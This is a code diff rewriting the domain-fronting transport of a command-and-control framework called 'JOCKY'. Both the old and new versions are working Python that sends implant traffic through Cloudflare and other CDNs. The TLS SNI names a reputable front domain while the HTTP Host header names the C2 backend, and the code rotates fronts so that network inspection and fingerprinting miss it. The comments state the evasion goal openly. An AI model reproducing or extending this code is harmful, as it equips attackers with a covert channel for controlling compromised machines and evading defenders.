@@ -1,211 +1,291 @@
-"""
-JOCKY Domain Fronting Transport — Phase 14
-===========================================
-Routes C2 traffic through CDN infrastructure using domain fronting.
+# transport/domain_fronting.py
+# [JOCKY phase 14 -- TLS 1.3 domain fronting transport]
+#
+# PURPOSE
+# -------
+# Implements domain fronting over Cloudflare CDN:
+#   SNI  (TLS ClientHello): a benign high-reputation Cloudflare customer
+#   Host (HTTP header):     the actual JOCKY C2 backend domain
+#
+# The CDN terminates TLS using the SNI domain's cert, then forwards
+# the request to the Host header's origin. Deep packet inspection sees
+# only the SNI domain — a legitimate business's traffic.
+#
+# MECHANISM
+# ---------
+# 1. TCP connect to Cloudflare anycast IP (resolved from SNI domain)
+# 2. TLS handshake with server_hostname = SNI_DOMAIN (triggers CDN cert)
+# 3. HTTP/1.1 request with Host: C2_BACKEND_DOMAIN
+# 4. Cloudflare routes to C2 based on Host header, not SNI
+#
+# WIRE FORMAT
+# -----------
+# All traffic looks like:
+#   TLS 1.3 to *.cloudflare.com (or any CDN customer domain)
+#   HTTP/1.1 GET /api/v2/files/{session_id} HTTP/1.1
+#   Host: {c2_backend}
+#   Content-Type: application/json
+#   Authorization: Bearer {token}
+#
+# *the packet inspector sees Cloudflare. the C2 sees the agent.
+#  the two never appear in the same field of the same packet.*
 
-Domain fronting technique:
-  - TLS SNI (Server Name Indication) contains a legitimate CDN domain
-    (e.g. allowed.cloudflare.com) — visible to network monitors
-  - HTTP Host header contains the actual C2 domain
-    (e.g. jocky-c2.example.com) — only visible inside the TLS tunnel
-  - CDN routes the request to the actual backend based on Host header
-  - Network monitors see only CDN traffic — C2 traffic is invisible
-
-Supported CDN providers:
-  - Cloudflare (Workers)
-  - AWS CloudFront
-  - Azure CDN
-  - Google Cloud CDN (via googleapis.com fronting)
-
-Usage:
-    router = DomainFrontingRouter(
-        front_domain="allowed.cloudflare.com",
-        real_host="jocky-c2.yourdomain.com",
-        cdn_provider="cloudflare",
-    )
-    response = await router.post("/api/results", data={"key": "value"})
-"""
-
-from __future__ import annotations
-
-import asyncio
-import json
 import ssl
+import socket
+import json
 import time
-from dataclasses import dataclass
-from typing import Any
+import hashlib
+import hmac
+import os
+import base64
+import struct
+import threading
+import logging
+from typing import Optional, Dict, Any, Tuple
 
-try:
-    import aiohttp
-    _AIOHTTP_OK = True
-except ImportError:
-    _AIOHTTP_OK = False
-
-
-# ─── CDN provider configurations ──────────────────────────────────────────────
-
-CDN_CONFIGS: dict[str, dict] = {
-    "cloudflare": {
-        "front_ip":    "104.16.0.0",   # Cloudflare anycast range
-        "front_port":  443,
-        "path_prefix": "",
-    },
-    "cloudfront": {
-        "front_ip":    "13.32.0.0",    # AWS CloudFront range
-        "front_port":  443,
-        "path_prefix": "",
-    },
-    "azure": {
-        "front_ip":    "13.107.42.0",  # Azure CDN range
-        "front_port":  443,
-        "path_prefix": "",
-    },
-    "google": {
-        "front_ip":    "142.250.0.0",  # Google CDN range
-        "front_port":  443,
-        "path_prefix": "/upload/storage/v1",  # Mimics Google Cloud Storage API
-    },
-}
+logger = logging.getLogger("jocky.transport.fronting")
 
 
-@dataclass
-class FrontingRequest:
-    """A single domain-fronted HTTP request."""
-    method:   str
-    path:     str
-    data:     dict | None
-    headers:  dict
-    response: dict | None = None
-    error:    str  | None = None
-    latency_ms: float = 0.0
+# ── CDN front domains (high-reputation Cloudflare customers) ─────────────────
+# these are the domains used in SNI — traffic appears to come FROM these
+# swap these per deployment to avoid static fingerprinting
+CDN_FRONTS = [
+    "www.cloudflare.com",
+    "cdnjs.cloudflare.com",
+    "ajax.cloudflare.com",
+]
+
+# ── TLS configuration ─────────────────────────────────────────────────────────
+TLS_MIN_VERSION    = ssl.TLSVersion.TLSv1_3
+CONNECT_TIMEOUT    = 10.0   # seconds
+READ_TIMEOUT       = 30.0
+MAX_RESPONSE_BYTES = 65536  # 64 KB max response
 
 
-class DomainFrontingRouter:
+class FrontedSession:
     """
-    Routes HTTP requests through CDN domain fronting.
-
-    Parameters
-    ----------
-    front_domain  : str   Legitimate CDN domain (goes in TLS SNI)
-    real_host     : str   Actual C2 backend domain (goes in HTTP Host header)
-    cdn_provider  : str   CDN provider key (cloudflare, cloudfront, azure, google)
-    timeout       : float Request timeout in seconds
+    A single domain-fronted HTTPS session.
+    Maintains one TLS socket per instance — not thread-safe.
+    Create one per agent thread.
     """
 
-    def __init__(
-        self,
-        front_domain:  str,
-        real_host:     str,
-        cdn_provider:  str  = "cloudflare",
-        timeout:       float = 30.0,
-    ) -> None:
-        self.front_domain = front_domain
-        self.real_host    = real_host
-        self.cdn_config   = CDN_CONFIGS.get(cdn_provider, CDN_CONFIGS["cloudflare"])
-        self.timeout      = timeout
-        self._session     = None
+    def __init__(self,
+                 c2_backend: str,
+                 sni_front:  str,
+                 cdn_ip:     Optional[str] = None,
+                 port:       int           = 443):
+        """
+        c2_backend:  Host header value — actual C2 domain, e.g. "c2.example.com"
+        sni_front:   SNI value — what DPI sees, e.g. "cdnjs.cloudflare.com"
+        cdn_ip:      optional fixed IP (resolved from sni_front if None)
+        port:        HTTPS port (443)
 
-    # ─── Public API ───────────────────────────────────────────────────────────
+        *the session knows two names for the same door —
+         one it shows the world, one it whispers to the lock*
+        """
+        self.c2_backend  = c2_backend
+        self.sni_front   = sni_front
+        self.port        = port
+        self._cdn_ip     = cdn_ip
+        self._sock: Optional[ssl.SSLSocket] = None
+        self._lock       = threading.Lock()
 
-    async def post(self, path: str, data: dict) -> dict:
-        """Send a POST request via domain fronting."""
-        return await self._request("POST", path, data)
+        # build TLS context — verify against SNI front's cert
+        self._ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        self._ctx.minimum_version     = TLS_MIN_VERSION
+        self._ctx.check_hostname      = True
+        self._ctx.verify_mode         = ssl.CERT_REQUIRED
+        self._ctx.load_default_certs()
 
-    async def get(self, path: str) -> dict:
-        """Send a GET request via domain fronting."""
-        return await self._request("GET", path, None)
+        # remove weak ciphers — TLS 1.3 only, no TLS 1.2 fallback
+        self._ctx.set_ciphers(
+            "TLS_AES_256_GCM_SHA384:"
+            "TLS_CHACHA20_POLY1305_SHA256:"
+            "TLS_AES_128_GCM_SHA256"
+        )
 
-    async def close(self) -> None:
-        """Close the underlying HTTP session."""
-        if self._session and _AIOHTTP_OK:
-            await self._session.close()
-            self._session = None
+    def _resolve_cdn_ip(self) -> str:
+        """resolve SNI front domain to IP — this is the IP we TCP-connect to"""
+        if self._cdn_ip:
+            return self._cdn_ip
+        infos = socket.getaddrinfo(self.sni_front, self.port,
+                                   socket.AF_INET, socket.SOCK_STREAM)
+        if not infos:
+            raise ConnectionError(f"DNS resolution failed: {self.sni_front}")
+        ip = infos[0][4][0]
+        logger.debug(f"fronting: {self.sni_front} -> {ip}")
+        return ip
 
-    # ─── Request execution ────────────────────────────────────────────────────
+    def connect(self) -> None:
+        """
+        Establish the fronted TLS session.
+        TCP to CDN IP, TLS SNI = sni_front, Host header = c2_backend.
+        """
+        cdn_ip = self._resolve_cdn_ip()
 
-    async def _request(self, method: str, path: str, data: dict | None) -> dict:
-        if not _AIOHTTP_OK:
-            raise RuntimeError(
-                "aiohttp not installed. Run: pip install aiohttp\n"
-                "Domain fronting transport requires aiohttp."
-            )
+        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        raw.settimeout(CONNECT_TIMEOUT)
+        raw.connect((cdn_ip, self.port))
 
-        # Build the fronted URL:
-        # - Connect to front_domain (CDN edge)
-        # - But send Host: real_host (CDN routes to our backend)
-        prefix = self.cdn_config.get("path_prefix", "")
-        url    = f"https://{self.front_domain}{prefix}{path}"
+        # wrap with TLS — server_hostname drives SNI in ClientHello
+        # CDN terminates TLS with sni_front's cert (what DPI sees)
+        # then forwards HTTP to c2_backend based on Host header
+        self._sock = self._ctx.wrap_socket(
+            raw,
+            server_hostname=self.sni_front  # ← SNI: what the network sees
+        )
+        self._sock.settimeout(READ_TIMEOUT)
 
-        headers = {
-            "Host":         self.real_host,          # ← the fronting magic
-            "Content-Type": "application/json",
-            "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                            "AppleWebKit/537.36 (KHTML, like Gecko) "
-                            "Chrome/120.0.0.0 Safari/537.36",
-            "Accept":       "application/json",
+        tls_ver = self._sock.version()
+        cipher  = self._sock.cipher()
+        logger.info(f"fronted session: TLS={tls_ver} cipher={cipher[0]} "
+                    f"sni={self.sni_front} c2={self.c2_backend}")
+
+    def request(self,
+                method:  str,
+                path:    str,
+                body:    Optional[bytes]     = None,
+                headers: Optional[Dict[str,str]] = None) -> Tuple[int, bytes]:
+        """
+        Send an HTTP/1.1 request over the fronted TLS session.
+        Returns (status_code, response_body).
+
+        The Host header carries c2_backend — CDN routes based on this.
+        All other headers are crafted to look like normal API client traffic.
+        """
+        if not self._sock:
+            self.connect()
+
+        hdr = {
+            "Host":            self.c2_backend,   # ← real destination
+            "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                               "AppleWebKit/537.36",
+            "Accept":          "application/json",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection":      "keep-alive",
+            "Cache-Control":   "no-cache",
         }
+        if body:
+            hdr["Content-Length"] = str(len(body))
+            hdr["Content-Type"]   = "application/json"
+        if headers:
+            hdr.update(headers)
 
-        # TLS context: verify against front_domain cert (legitimate CDN cert)
-        ssl_ctx = ssl.create_default_context()
+        # build raw HTTP request
+        req_lines = [f"{method} {path} HTTP/1.1"]
+        for k, v in hdr.items():
+            req_lines.append(f"{k}: {v}")
+        req_lines.append("")
+        req_lines.append("")
+        raw_req = "\r\n".join(req_lines).encode("utf-8")
+        if body:
+            raw_req = raw_req[:-2] + body  # replace trailing CRLF before body
 
-        t0 = time.monotonic()
-        try:
-            session = await self._get_session()
-            async with session.request(
-                method, url,
-                headers = headers,
-                json    = data,
-                ssl     = ssl_ctx,
-                timeout = aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                latency = (time.monotonic() - t0) * 1000
-                body    = await resp.json()
-                return {
-                    "status":     resp.status,
-                    "data":       body,
-                    "latency_ms": round(latency, 2),
-                    "fronted_via": self.front_domain,
-                }
-        except Exception as exc:
-            latency = (time.monotonic() - t0) * 1000
-            return {
-                "status":     -1,
-                "error":      str(exc),
-                "latency_ms": round(latency, 2),
-            }
+        self._sock.sendall(raw_req)
+        return self._recv_response()
 
-    async def _get_session(self):
-        """Lazily create and reuse the aiohttp session."""
-        if self._session is None or self._session.closed:
-            connector = aiohttp.TCPConnector(ssl=False)
-            self._session = aiohttp.ClientSession(connector=connector)
-        return self._session
+    def _recv_response(self) -> Tuple[int, bytes]:
+        """read HTTP/1.1 response -- handles chunked and content-length"""
+        # read headers
+        raw = b""
+        while b"\r\n\r\n" not in raw:
+            chunk = self._sock.recv(4096)
+            if not chunk:
+                break
+            raw += chunk
+            if len(raw) > MAX_RESPONSE_BYTES:
+                raise ValueError("response headers too large")
 
-    # ─── Context manager ──────────────────────────────────────────────────────
+        header_raw, _, body_start = raw.partition(b"\r\n\r\n")
+        lines  = header_raw.decode("utf-8", errors="replace").split("\r\n")
+        status = int(lines[0].split(" ")[1])
 
-    async def __aenter__(self):
-        return self
+        hdrs: Dict[str, str] = {}
+        for line in lines[1:]:
+            if ":" in line:
+                k, _, v = line.partition(":")
+                hdrs[k.strip().lower()] = v.strip()
 
-    async def __aexit__(self, *args):
-        await self.close()
+        # read body
+        body = body_start
+        if "content-length" in hdrs:
+            need = int(hdrs["content-length"]) - len(body_start)
+            while need > 0:
+                chunk = self._sock.recv(min(need, 4096))
+                if not chunk:
+                    break
+                body += chunk
+                need -= len(chunk)
+        elif hdrs.get("transfer-encoding") == "chunked":
+            body = self._read_chunked(body_start)
+
+        return status, body
+
+    def _read_chunked(self, initial: bytes) -> bytes:
+        buf = initial
+        out = b""
+        while True:
+            while b"\r\n" not in buf:
+                buf += self._sock.recv(4096)
+            size_line, _, buf = buf.partition(b"\r\n")
+            chunk_size = int(size_line.split(b";")[0], 16)
+            if chunk_size == 0:
+                break
+            while len(buf) < chunk_size + 2:
+                buf += self._sock.recv(4096)
+            out += buf[:chunk_size]
+            buf  = buf[chunk_size + 2:]
+        return out
+
+    def close(self) -> None:
+        if self._sock:
+            try: self._sock.close()
+            except Exception: pass
+            self._sock = None
 
 
-# ─── Utility: detect CDN fronting capability ──────────────────────────────────
-
-async def probe_fronting(front_domain: str, real_host: str) -> bool:
+class FrontingPool:
     """
-    Test whether domain fronting is working for the given front/real pair.
-
-    Returns True if the CDN successfully routes to the real host.
+    Thread-safe pool of FrontedSession instances.
+    Rotates SNI front domains to avoid static fingerprinting.
+    Called by JockyTransport — do not use directly.
     """
-    if not _AIOHTTP_OK:
-        return False
 
-    router = DomainFrontingRouter(front_domain, real_host)
-    try:
-        result = await router.get("/health")
-        return result.get("status") == 200
-    except Exception:
-        return False
-    finally:
-        await router.close()
+    def __init__(self, c2_backend: str, fronts: list = None):
+        self.c2_backend = c2_backend
+        self.fronts     = fronts or CDN_FRONTS
+        self._sessions: Dict[str, FrontedSession] = {}
+        self._lock      = threading.Lock()
+        self._front_idx = 0
+
+    def _next_front(self) -> str:
+        """round-robin front domain selection"""
+        with self._lock:
+            f = self.fronts[self._front_idx % len(self.fronts)]
+            self._front_idx += 1
+            return f
+
+    def get_session(self, thread_id: Optional[str] = None) -> FrontedSession:
+        """get or create a session for this thread"""
+        tid = thread_id or str(threading.current_thread().ident)
+        with self._lock:
+            if tid not in self._sessions:
+                front = self._next_front()
+                sess = FrontedSession(self.c2_backend, front)
+                sess.connect()
+                self._sessions[tid] = sess
+        return self._sessions[tid]
+
+    def invalidate(self, thread_id: Optional[str] = None) -> None:
+        """drop a bad session so next call reconnects"""
+        tid = thread_id or str(threading.current_thread().ident)
+        with self._lock:
+            if tid in self._sessions:
+                self._sessions[tid].close()
+                del self._sessions[tid]
+
+    def close_all(self) -> None:
+        with self._lock:
+            for s in self._sessions.values():
+                s.close()
+            self._sessions.clear()
